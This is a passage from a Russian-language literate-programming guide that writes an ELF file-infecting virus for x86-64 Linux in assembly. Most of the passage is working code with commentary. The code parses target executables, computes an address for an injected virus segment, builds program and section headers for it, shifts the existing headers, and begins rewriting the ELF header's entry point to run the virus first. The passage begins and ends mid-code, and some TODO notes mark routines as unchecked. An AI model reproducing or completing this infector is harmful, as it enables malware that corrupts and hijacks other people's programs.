      mov     $-1, %rax

  _get_phdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Поскольку у нас уже есть базовый адрес ELF-а, который нам вернула
~openfile~, мы сложим его со смещением, полученным из ~e_phoff~ и получим
адрес таблицы сегментов в памяти. Сохранив этот адрес в переменную
~victim_phdr_table_addr~, мы будем иметь к нему доступ в любой момент.

Значение, полученное из ~e_phnum~, сохраним в переменную
~victim_phdr_amount~. Зная, сколько в таблице заголовков и сколько байт
занимает каждый из них, можно легко вычислить размер всей таблицы,
умножив значение из ~victim_phdr_amount~ на размер 1 заголовка. Сохраним
это значение в переменную ~victim_phdr_table_size~.

Поскольку нам предстоит взаимодействовать с разными полями заголовка, то
введм константы, которые будут обозначать смещение от начала загоовка до
интересующего нас поля.

#+NAME: _phdrs_consts
#+BEGIN_SRC asm :noweb yes
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30

<<_shdrs_consts>>
#+END_SRC

** Найти последний LOAD-сегмент

Чтоб рассчитать виртуальный адрес сегмента вируса, нам нужно узнат
виртуальный адрс последнего загружаемого сегмента и его выравнивание.

Поэтому организуем проход циклом по заголовкам сегментов и выдерем среди
них такой, который будет заголовокм LOAD-сегмента у которого будет самый
большой виртуальный адрес.

На нулевой итерации мы берем виртуальный адрес первого заголовка в
таблице. Затем на каждой итерации проверяем два фактора: является ли
текущий заголовок - заголовоком LOAD сегмента (у него будет тип 1), и
больше ли его виртуальный адрес сохраненного адреса. Если больше, то
сохраняем его адрес. Иначе пропускаем.

#+NAME: _find_last_seg_vaddr
#+BEGIN_SRC asm
    /// _FIND_LAST_SEG_VADDR
  /// Ищет виртуальный адрес последнего сегмента кода
  _find_last_seg_vaddr:
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_last_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_last_seg_vaddr_fail

      mov     %r8, %rdi
  _find_last_seg_vaddr_cycle:

      cmp     $1, (%rdi)
      jne     _find_last_seg_vaddr_next

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jg      _set_last_seg
      jmp     _find_last_seg_vaddr_next

  _set_last_seg:
      mov     %rdi, %r8

  _find_last_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_last_seg_vaddr_cycle

  _find_last_seg_vaddr_success:
      leaq    last_seg_vaddr(%rip), %rsi

      mov     PHDR_P_VADDR(%r8), %rax
      mov     PHDR_P_ALLIGN(%r8), %rcx

      mov     %rax, (%rsi)
      leaq    last_seg_allign(%rip), %rsi
      mov     %rcx, (%rsi)

      xor     %rax, %rax
      jmp     _find_last_seg_vaddr_exit

  _find_last_seg_vaddr_fail:
      mov     $-1, %rax

  _find_last_seg_vaddr_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      ret
#+END_SRC

** Найти код мишени между двумя таблицами заголовков

Нам нужно будет вставить между таблицей заголовков сегментов и кодом
мишени новый заголовок. Это значит, что сначала придется в файл
записывать отдельно таблицу заголовков, затем новый заголовок, затем весь
код мишени.

Таким образом нужно получить указатель на этот код и высчитать размер.
Вы считать это просто: код жертвы начнется сразу от талицы заголовков
сегментов. Так что мы берем размер этой таблицы + размер заголовка
эльфа + базовый адрес эльфа в памяти = адрес начала кода жертвы в памяти.

Затем высчитываем конечный адрес: базовый адрес эльфа в памяти + смещение
до таблицы заголовков секций. Вычитая один адрес из другого, мы получаем
размер этого кода.

#+NAME: _get_victim_whole_code_addr_and_size
#+BEGIN_SRC asm
  /// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
  /// Высчитывает адрес и размер всего кода жертвы,
  /// если мы не генерируем запись BIND_NOW
  _get_victim_whole_code_addr_and_size:
      push    %rcx
      push    %rdx

      // проверяем наличие всех необходимых данных
      // мы генерируем новыую запись BIND_NOW?
      // если да, то этот метод вычисления размера и адреса
      // кода жертвы нам не подходит
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      jne     _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      // вычисляем размер и адрес кода жертвы
      leaq    victim_code_offset(%rip), %rdx
      mov     %rcx, (%rdx)
      add     $0x40, (%rdx)

      // считаем адрес кода жертвы
      mov     victim_phdr_table_addr(%rip), %rdx
      add     %rdx, %rcx
      mov     %rcx, victim_code_addr(%rip)

      // считаем  размер кода жертвы
      mov     victim_shdr_table_addr(%rip), %rdx
      sub     %rcx, %rdx
      mov     %rdx, victim_code_size(%rip)

      xor     %rax, %rax
      jmp     _get_victim_whole_code_addr_and_size_exit

  _get_victim_whole_code_addr_and_size_fail:
      mov     $-1, %rax

  _get_victim_whole_code_addr_and_size_exit:
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

** Найти первый LOAD-сегмент

В следующих разделах нам много раз понадобится узнать, с какого
виртуального адреса начинается ELF-файл мишени, этот адрес будет
участвовать в различных вычислениях и т.д.

К счастью, начало файла и начало первого LOAD-сегмента - это одно и то
же. Поэтому мы найдем этот сегмент и сохраним его адрес. Пока что
достаточно знать, что он позволит быстро определять, является ли текущий
заголовок сегмента заголовокм первого LOAD-сегмента или нет.

Найти такой сегмент просто: у него будет самый маленький виртуальный
адрес. Нужно просто пройтись циклом по заголовкам сегментов и найти
загоовок с таким адресом.

Вот как это реализовано:

#+NAME: _find_first_seg_vaddr
#+BEGIN_SRC asm
  /// Ищет и заполняет данные о
  /// первом сегменте кода эльфа
  _find_first_seg_vaddr:
      push    %rcx
      push    %r8

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_first_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_first_seg_vaddr_fail

      mov     %r8, %rdi

  _find_first_seg_vaddr_cycle:
      cmp     $0x1, (%rdi)
      jne     _find_first_seg_vaddr_next

      cmp     $0x1, (%r8)
      jne     _set_first_seg

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jl      _set_first_seg
      jmp     _find_first_seg_vaddr_next

  _set_first_seg:
      mov     %rdi, %r8

  _find_first_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_first_seg_vaddr_cycle

  _find_first_seg_vaddr_success:
      leaq    first_seg_vaddr(%rip), %rsi
      mov     PHDR_P_VADDR(%r8), %rdi
      mov     %rdi, (%rsi)

      leaq    first_seg_addr(%rip), %rsi
      mov     %r8, (%rsi)

      xor     %rax, %rax
      jmp    _find_first_seg_vaddr_exit

  _find_first_seg_vaddr_fail:
      mov     $-1, %rax

  _find_first_seg_vaddr_exit:
      pop     %r8
      pop     %rcx
      ret

#+END_SRC

** Найти первую секцию мишени типа PROGBITS

В каждом заголовке секции есть поле ~sh_name~ - оно содержит в себе
индекс строки, которая находится в таблице строк ~.strtab~. Фактически
это название секции.

Поскольку мы генерируем заголовк секции вируса, если мишень не стрипнута,
то придется заполнять поле ~sh_name~ в этом заголовке каким-то индексом
строки. Генерировать свою строку и ее вставлять - это лишние
проблемы. Вместо этого мы украдем индекс у ближайшей секции типа
PROGBITS - именно такого типа заголовок секции ~.text~.

[TODO:gmm] по-моему, можно в принципе взять любой индекс и загрузчику
будет особо пофиг, можно всегда брать индекс 0. Но это нужнается в проверке.

Поэтому мы пройдемся циклом по всем заголовкам секций, как только найдем
заголовк типа PROGBITS, считываем индекс строки сохраняем в переменную
~sh_name_indx~.

#+NAME: _find_victim_text_section
#+BEGIN_SRC asm
  /// _FIND_VICTIM_TEXT_SECTION
  /// находит секцию text для заражения -
  /// этот сегмент содержит e_entry
  // Как понять, что сегмент содержит e_entry:
  // его sh_addr <= e_entry,
  // его sh_addr + sh_size > e_entry
  /// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
  /// индекс в таблице строк, его же присвоим новому заголовку
  /// секции вируса

      .globl  _find_victim_text_section
      .type	_find_victim_text_section, @function
  _find_victim_text_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // проверяем наличие необходимых для посика данных
      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     ELF_E_ENTRY(%rdi), %rdx

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_victim_text_section_fail

  _find_victim_text_section_cycle:
      mov     %rdi, %rax
      mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

      cmp     %rdx, %rbx  # addr долен быть <= e_entry
      jg      _next_iter_find_text

      mov    %rax, %rdi
      mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

      add    %rsi, %rbx   # адрес конца текущeго сегмент

      cmp    %rdx, %rbx   # cur sect. end > e_entry
      jl     _next_iter_find_text

      jmp    _find_text_success   # section is found
  _next_iter_find_text:

      add     $0x40, %rax
      mov     %rax, %rdi

      loop    _find_victim_text_section_cycle
      jmp     _find_victim_text_section_fail

  _find_text_success:
      leaq    sh_name_indx(%rip), %rcx
      movl    (%rax), %edx
      movl    %edx, (%rcx)  # save sect. sh_name
      xor     %rax, %rax
      jmp     _find_text_exit

  _find_victim_text_section_fail:
      mov     $-1, %rax

  _find_text_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

** Объединить парсинг жертвы в единый алгоритм


Теперь, когда весь необходимый функционал написан, его хорошо бы
объединить в единый блок, который будет осуществлять весь парсинг жертвы
от начала до конца. Именно это будет делать функция ~parse_victim~: она
последовательно парсит жертву и если на каком-то этапе парсинг не удался,
то она вернет -1, а если все прошло хорошо, то в переменную
~parse_success~ будет занесен ноль: это позволит в любой момент
исполнения программы определить, завершился ли парсинг.

#+NAME: _parse_victim
#+BEGIN_SRC asm :noweb yes
  /// _PARSE_VICTIM
  /// Вызывает парсинг жертвы
  /// В случае провала возвращ -1
  _parse_victim:
      call    _get_victim_addr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _is_it_elf
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_shdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _check_file_infection
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_phdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_first_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_last_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      <<_call_find_dynamic>>
  _check_bind_now:

      <<_call_find_bind_now_record>>

      <<_call_find_got_section_vaddr>>

      <<_call_find_got_section_im_memory>>

  _get_victim_code:
      call    _get_victim_whole_code_addr_and_size
      test    %rax, %rax
      je      _find_first_text_section

      <<_call_get_victim_code_addr_and_size_with_bind_now>>

  _find_first_text_section:
      call    _find_victim_text_section
      test    %rax, %rax
      jne     _parse_victim_fail

      <<_call_find_symtab>>

      call    _count_victim_code_begin_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

  _parse_victim_success:
      movq    $0, parse_success(%rip)
      xor     %rax, %rax
      jmp     _parse_victim_exit

  _parse_victim_fail:
      mov   $-1, %rax

  _parse_victim_exit:
      ret

#+END_SRC

** Получить данные о вирусе

Нам о вирусе нужно знать всего две вещи: адрес, по которому его
исполняемый код располагается в памяти, и размер этого кода.

Поскольку вирус уже загружен в память, нам не нужно мапить его файл
дополнительно. Все, что понадобится - это считать адрес его метки
~_start~ - это и будет адрес исполняемого кода.

С подсчеттом размера все чуть сложнее.
После того, как вирус отработает, нам нужно передать управление обратно
на код мишени. Как именно это будет сделано, я опишу ниже. Пока что нам
достаточно знать, что у нас будет некий блок кода, который будет вписан
за кодом вируса таким обрзом, чтоб вместо выхода, он исполнил его.

Поэтому мы загрузим адрес ~_global_exit~  - эта метка указывает на
обертку для ~exit~ - и вычтем из этой метки адрес ~_start~. Так получится
размер кода вируса от начала до его функции выхода. А затем к этому
размеру прибавим размер блока кода, который передаст управление жертве,
из ~transfer_control_code_size~. Мы делаем это, потому что блок кода,
передающий управление жертве, чисто по логике относится к коду вируса, и
потому что размер вируса будет часто фигурировать как параметр различных
вычислений в вирусе и в какой-то момент можно легко забыть, что нужно
учитывать размер блока, передающего управление.

Вот как это реализовано:

#+NAME:  _get_virus_code
#+BEGIN_SRC asm

  /// _GET_VIRUS_CODE
  ///
  /// Читает указатель начала кода вируса и размер этого
  /// кода.
  /// Записывает адрес кода вируса в virus_code_addr и
  /// размер этого кода в virus_code_size
  _get_virus_code:
      push    %rdi
      push    %rsi

      leaq    _start(%rip), %rdi  # начало вируса
      mov     %rdi, virus_code_addr(%rip)

      leaq    _global_exit(%rip), %rsi
      sub     %rdi, %rsi  # virus size

      # exit + размер блока передачи управления
      mov     transfer_control_code_size(%rip), %rax
      add     %rax, %rsi

      leaq    virus_code_size(%rip), %rdi
      mov     %rsi, (%rdi)

  _get_virus_code_success:
      xor     %rax, %rax
      movq    $0, get_virus_success(%rip)

      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

В случае успеха функция заносит 0 в переменную ~get_virus_success~, что
позволяет однозначно определить из любой точки программы, что данный этап
завершился успешно.

** Рассчитать адрес вируса

Чтобы он был валидным, важно соблюдать ограничение: виртуальный адрес сегмента
минус смещение сегмента в файле должно иметь адрес кратный 4
килобайтам.

- Найти последний (с точки зрения размещения в памяти) LOAD-сегмент
  мишени, т.е. сегмент, у которого самый большой виртуальный
  адрес. Из этого сегмента нам понадобятся:
  - его виртуальный адрес ~p_vaddr~
  - его выравнивание ~p_align~
- Выровнять полученный ~p_vaddr~ на 4Кб - получим выровненный адрес
  последнего LOAD-сегмента.
  Виртуальные адреса по умолчанию не выровнены, поэтому нам нужно это
  сделать.
- К нему прибавляем ~p_align~, получаем промежуточный результат -
  адрес страницы памяти, на которой будет расположен
  вирус.
  ~p_allign~ - это выравнивание последнего сегмента. Если у
  последнего сегмента есть выравнивание, а мы посчитали новый адрес
  вируса, не учитывая это, то скорее всего сегмент вируса придется
  прямо на выравнивание последнего сегмента. В теории, это может
  привести к сегфолту, поэтому мы учитываем выравнивание.

- К нему прибавляем содежимое поля ~e_shoff~ из ELF-Header. Оно
  содержит смещение до заголовков секций, которое станет смещением
  вируса в файле, поскольку вирус встанет вместо заголовков секций, а
  они сместятся. Получили виртуальный адрес вируса.


Вот как это реализовано:

#+NAME: _count_virus_new_vaddr
#+BEGIN_SRC asm
  /// _COUNT_VIRUS_NEW_VADDR
  /// Считает виртуальный адрес вируса внутри
  /// инфицированной жертвы
  /// Адрес считается как
  /// vaddr последнего загружаемого сегмента кода жертвы +
  /// ее выравнивание + смещение до кода вируса в файле
  _count_virus_new_vaddr:
      push    %rbx
      push    %rcx

      mov     last_seg_vaddr(%rip), %rax
      test    %rax, %rax
      je      _count_virus_new_vaddr_fail

      mov    	last_seg_allign(%rip), %rbx

      and     $~0xFFF, %rax
      add     %rbx, %rax

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _count_virus_new_vaddr_fail

      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      add     %rbx, %rax

      mov     %rax, virus_new_vaddr(%rip)

  _count_virus_new_vaddr_success:
      xor     %rax, %rax
      jmp     _count_virus_new_vaddr_exit

  _count_virus_new_vaddr_fail:
      mov      $-1, %rax

  _count_virus_new_vaddr_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Поскольку генерация новых данных в общем можно отнести к редактированию
файла мишени, вызовем эту функцию из ~recount_victim~:

#+NAME: _call_count_virus_new_vaddr
#+BEGIN_SRC asm :noweb yes
        call    _count_virus_new_vaddr
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

  [TODO:gmm] Проверь этот вариант

  NB: возможен другой вариант подсчета:
  - берем p_vaddr последнего сегмента
  - берем p_memsz этого сегмента и складываем с p_vaddr - получили
    адрес, на котором сегмент заканчивается
  - берем выравнивание сегмента из поля p_allign и считаем следующий
    адрес, начиная от того, на котором сегмет заканчивается, который
    подходит под выравнивание. Минимальное допустимое выравниание
    0x1000 -  выравнивание по 4кю памяти.
  - прибавляем к нему содерживое моле e_shoff.

    Пример: p_vaddr последнего сегмента - 0x600e10, p_memsz - 0x270,
    выравнивание 0x200000, поле e_shoff - 0x1234.
    0x600e10 + 0х270 = 0x601080
    Чтоб было проще искать выровненный адрес, выровняем этот по 4кб -
    получили 601000. 0х601000 + 0х200000 = 0х801000. Получили адрес страницы
    памяти, на которой будет сегмент вируса. 0х801000 + 0х1234 =
    0х802234. Это валидный адрес вируса.

** Сформировать заголовок сегмента вируса

Внимательно прочитав документацию, мы знаем, как выглядит структура
заголовка сегмента и заголовока секции.

Для начала выделим память под заголовок.

#+NAME: virus_new_phdr
#+BEGIN_SRC asm

   virus_new_phdr:
        .space 0x38, 0

#+END_SRC

Вот какие значения будут в заголовке сегмента вируса:
- p_type - 4 байта, знач. 1 - LOAD-сегмент.
- p_flags - 4 байта, знач. 1 - разрешение на исполнение
- p_offset - 8 байт, смещение вируса в файле.
  Посчитать его просто: мы знаем, что вирус встанет вместо таблицы
  заголовков секций, а сама таблица сместится. Поэтому просто берем
  смещение таблицы секций из поля ~e_shoff~ заголовка ELF-a и вписываем его сюда.
- p_vaddr - 8 байт, виртуальный адрес вируса. Как его считать было
  показано выше.
- p_paddr - аналогично ~p_vaddr~. Поле ~p_addr~ - это физический адрес
  сегмента. Поскольку мы его обыно до загрузки не знаем, то это поле
  обычно совпадает с ~p_vaddr~.
- p_filesz - 8 байт, размер вируса в файле. Чтоб посчитать это,
  достаточно иметь метку ~_start~ в начале вируса и метку ~fin~ в самом
  его конце. Вычитаем ~_start~ из ~fin~ и получаем размер вируса в файле.
- p_memsz - 8 байт, размер вируса в памяти (аналогичен p_filesz в нашем
  случае, поскольку у нас нет неинициализированных данных в вируса)
- p_allign - 8 байт, - значение 0, выравнивание не требуется, поскольку
  после вируса ничего не идет

Закодим создание этого заголовка, которое фактически представляет собой
заполнение буфера данными:

#+NAME: _generate_virus_phdr
#+BEGIN_SRC asm
  /// _GENERATE_VIRUS_PHDR
  /// генерирует заголовок сегмента для кода вируса
  _generate_virus_phdr:
      push    %rbx
      push    %rcx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_phdr(%rip), %rax

      movb    $0x1, (%rax) # p_type
      add     $0x4, %rax

      movb    $0x5, (%rax) # p_flags
      add     $0x4, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      movq    %rbx, (%rax) # p_offset
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip),%rbx
      movq    %rbx, (%rax) # vaddr
      add     $0x8, %rax

      movq    %rbx, (%rax) # paddr
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx
      movq    %rbx, (%rax) # p_filesz

      // к размеру кода добавили блок данных жертвы
      mov     data_size(%rip), %rcx
      add     %rcx, (%rax)

      add     $0x8, %rax

      movq    %rbx, (%rax) # p_memsz
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поле p_allign при инициализации
      # заполнено нулями, что и нужно
  _generate_virus_phdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_phdr_exit
  _generate_virus_phdr_fail:
      mov     $-1, %rax

  _generate_virus_phdr_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

При полсчете поля ~p_offset~ используется значение переменной
~new_bind_now_flag_record_size~, полный смысл которой будет объяснен в последней
четверти этого мана. Пока что достаточно знать, что в этой переменной
есть некоторое константное значение.

** Сформировать заголовок секции вируса (если мишень не стрипнута)

Выделим память под заголовок:

#+NAME: virus_new_phdr
#+BEGIN_SRC asm
   virus_new_shdr:
        .space 0x40, 0

#+END_SRC

Вот как мы заполним этот заголовок:

- sh_name - 4 байта, значение - индекс в таблице строк, где строка -
  это имя секции.
- sh_type - 4 байта, тип секции 1 (PROGBITS) - значение секции
  определяется и используется программой единолично
- sh_flags - 8 байт, значение 4 - разрешение на исполнение
- sh_addr - 8 байт, виртуальный адрес вируса, аналогичен p_vaddr из
  заголовка сегмента вируса
- sh_offset - 8 байт, смещение вируса в файле, аналогично полю p_offset
  из заголовка сегмента вируса
- sh_size - 8 байт, размер вируса в файле, аналогично полю p_filesz из
  заголовка сегмента вируса
- sh_link - 8 байт, значение - 0 - не знаю, как точно интерпретируются
  два следующих поля, безопаснее поставить нули
- sh_info - 8 байт, значение 0
- sh_addralign - 8 байт, значение 0, выравнивание не требуется
- sh_entsize - 8 байт, значение 0, код не содержит никаких записей
  фиксированного размера

Ну и реализуем заполнение этого буфера нужными нам данными.

#+NAME: _generate_virus_shdr
#+BEGIN_SRC asm

  /// _GENERATE_VIRUS_SHDR
  /// генерирует заголовок секции для кода вируса
  _generate_virus_shdr:
      push    %rbx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_shdr(%rip), %rax
      leaq    sh_name_indx(%rip), %rbx

      movl    (%rbx), %ebx  # sh_name
      movl    %ebx,  (%rax)
      add     $0x4, %rax

      movb    $0x1, (%rax)  # sh_type
      add     $0x4, %rax

      movb    $0x6, (%rax)  # sh_flags
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip), %rbx
      mov     %rbx, (%rax)  # sh_addr
      add     $0x8, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      mov     %rbx, (%rax)  # sh_offset
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx

      mov     data_size(%rip), %rcx

      mov     %rbx, (%rax) # sh_size
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поля sh_link, sh_info, sh_addralign, sh_entsize
      # при инициализации записаны нулями,
      # а нам и нужно чтоб они были
      # заполнены нулями
  _generate_virus_shdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_shdr_exit

  _generate_virus_shdr_fail:
      mov     $-1, %rax

  _generate_virus_shdr_exit:
      pop     %rbx
      ret

#+END_SRC

** Поправить заголовки сегментов


Поскольку мы вставляем новый заголовок, то весь код сместится на 56
байт. А заголовки, которые описывают этот код, ничего не будут об этом
знать, если мы их не отредактируем. Если этого не сделать, то загрузчик
загрузит программу неправильно.

Чтоб указать, что весь код сместился, нужно отредактировать поля ~p_vaddr~
и ~p_offset~, которые отвечают за виртуальный адрес сегмента и его
смещение от начала файла, во всех заголовках сегментов, которые описывают
код, находящийся ~после~  таблицы сегментов.

При этом нам надо держать в уме два кейса, не укладывающихся в общий
алгоритм: заголовок первого LOAD-сегмента и заголовок самой таблицы
заголовков.

Начало первого LOAD-сегмента и начало ELF-а - это одно и то же. Этот
сегмент содержит в себе заголовок файла и таблицу заголовков
сегментов. Мы вставляем новый заголовок для вируса как бы внутрь него, а
не перед ним, поэтому его смещение или виртуальный адрес не изменятся.
Зато изменится размер: раз мы вставляем новый заголовок, то вся таблица
увеличится на 56 байт.

То же самое происходит с заголовком таблицы заголовков сегментов.

Хорошая новость в том, что мы можем легко опознать эти заголовки среди
прочих: заголовок таблицы заголовков сегментов имеет тип 6, который
хранится в поле ~p_type~. Заголовок такого типа может быть в единственном
числе в файле.  А виртуальный адрес первого LOAD-сегмента мы уже знаем,
так что его найти будет совсем просто.


#+NAME: _phdr_offset_and_addr_recount_withount_dynamic
#+BEGIN_SRC asm :noweb yes

  /// _PHDR_OFFSET_AND_ADDR_RECOUNT
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
  _phdr_offset_and_addr_recount:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      // проверяем данные,
      // необходимые для редактирования
      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _phdr_offset_and_addr_recount_fail

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _phdr_offset_and_addr_recount_fail

      mov     first_seg_vaddr(%rip), %rsi

      mov     $0x38, %rdx

  _phdr_offset_and_addr_recount_cycle:
      movl    (%rdi), %eax

      // это заголовок самой таблицы заголовков?
      cmp     $0x6,  %rax
      je      _edit_phdr_and_first_table_header
      jmp     _phdr_offset_and_addr_check

  _edit_phdr_and_first_table_header:

      add     %rdx, PHDR_P_MEMSZ(%rdi)
      add     %rdx, PHDR_P_FILESZ(%rdi)

      jmp     _next_iter_recount_phdr

  _phdr_offset_and_addr_check:
      cmp     %rsi, PHDR_P_VADDR(%rdi)
      je      _edit_phdr_and_first_table_header

      cmp     $0, PHDR_P_VADDR(%rdi)
      jle     _recount_offset

  _recount_vaddr_paddr:
      add     %rdx, PHDR_P_VADDR(%rdi)
      add     %rdx, PHDR_P_PADDR(%rdi)

  _recount_offset:
      cmp     $0, PHDR_P_OFFSET(%rdi)
      jle     _next_iter_recount_phdr

  _add_const_to_phdr_offset:
      add     %rdx, PHDR_P_OFFSET(%rdi)
      jmp     _next_iter_recount_phdr

  _next_iter_recount_phdr:
      add     $0x38, %rdi
      loop    _phdr_offset_and_addr_recount_cycle

  _phdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _phdr_offset_and_addr_recount_exit

  _phdr_offset_and_addr_recount_fail:
      mov     $-1, %rax

  _phdr_offset_and_addr_recount_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

[TODO:gmm] проверить текущий вариант на работоспособность

** Поправить заголовки секций

Поправить заголовки секций надо по той же причине, что и заголовки
сегментов. Но сделать это даже проще: мы будем редактировать только те
заголовки, которые описывают код, находящийся после таблицы заголовков
сегментов без каких-либо исключений.

Нам понадобится отредактировать только поля ~sh_addr~ и ~sh_offset~,
которые отвечают за виртуальный адрес и смещение секции в файле.

Посмотрим, как это реализовано:

#+NAME: _shdr_offset_and_addr_recount_without_dynamic
#+BEGIN_SRC asm :noweb yes
  /// _SHDR_OFFSET_AND_ADDR_RECOUNT
      .globl  _shdr_offset_and_addr_recount
      .type	_shdr_offset_and_addr_recount, @function

  _shdr_offset_and_addr_recount:
      push  %rbx
      push  %rdx
      push  %rcx
      push  %rdi
      push  %rsi

      // проверяем необходимые данные
      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _shdr_offset_and_addr_recount_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _shdr_offset_and_addr_recount_fail

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     $0x38, %rdx

  _shdr_offset_and_addr_recount_cycle:
      cmp     $0, SHDR_SH_ADDR(%rdi)
      jle     _recount_shdr_offset

  _add_const_to_addr:
      add     %rdx,  SHDR_SH_ADDR(%rdi)

  _recount_shdr_offset:
      cmp     $0, SHDR_SH_OFFSET(%rdi)
      jle     _next_iter_recount

  _add_const_to_offset:
      add     %rdx, SHDR_SH_OFFSET(%rdi)

  _next_iter_recount:
      add     $0x40, %rdi    # смещение до след. заголовка
      loop    _shdr_offset_and_addr_recount_cycle

  _shdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _shdr_offset_and_addr_recount_exit

  _shdr_offset_and_addr_recount_fail:
      mov      $-1, %rax

  _shdr_offset_and_addr_recount_exit:
      pop      %rsi
      pop      %rdi
      pop      %rcx
      pop      %rdx
      pop      %rbx
      ret

#+END_SRC

[TODO:gmm] проверить текущий вариант на работоспособность

** Отредактировать заголовок ELF-a

В заголовке ELF-a нам нужно отредактировать поля:
- ~e_phnum~ - оно увеличится на единицу, поскольку заголовков
  сегментов стало на 1 больше
- ~e_shnum~ - оно увеличится на единицу, поскольку количество заголовков
  секций тоже увеличилось
- ~e_shoff~ - поскольку мы вписываем вирус, то заголовки секций сместятся
  на его размер. Новое смещение высчитывается как старое смещение +
  размер вируса
- ~e_entry~ - нужно указать новую точку входа. Теперь это будет
  виртуальный код вируса. А старую точку входа мы сохраним, она еще понадобится

Посмотрим на реализацию этого редактирования.

#+NAME: _edit_elf_hdr
#+BEGIN_SRC asm :noweb yes

  /// _EDIT_ELF_HDR
  /// Редактирует заголовок эльфа
  /// и сохраняет его оргинальный e_entry
  _edit_elf_hdr:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     virus_code_size(%rip), %rsi
      test    %rsi, %rsi
      je      _edit_elf_hdr_fail

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _edit_elf_hdr_fail

      mov     virus_new_vaddr(%rip), %rdx
      test    %rdx, %rdx
